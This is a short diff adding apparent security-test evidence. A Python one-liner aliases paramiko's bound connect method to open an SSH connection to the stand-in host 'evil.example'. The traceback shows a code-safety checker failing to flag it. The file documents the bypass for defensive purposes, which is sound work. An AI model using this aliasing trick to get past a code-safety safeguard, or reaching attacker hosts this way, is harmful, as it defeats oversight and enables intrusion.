@@ -1,0 +1,6 @@
+{'code': "import paramiko; client=paramiko.SSHClient(); connect=client.connect; connect(hostname='evil.example')", 'policy': None}
+Traceback (most recent call last):
+  File "/evidence/bound_method_probe.py", line 4, in <module>
+    assert _check_code_safety(code,session_id='alias-probe') is not None
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+AssertionError
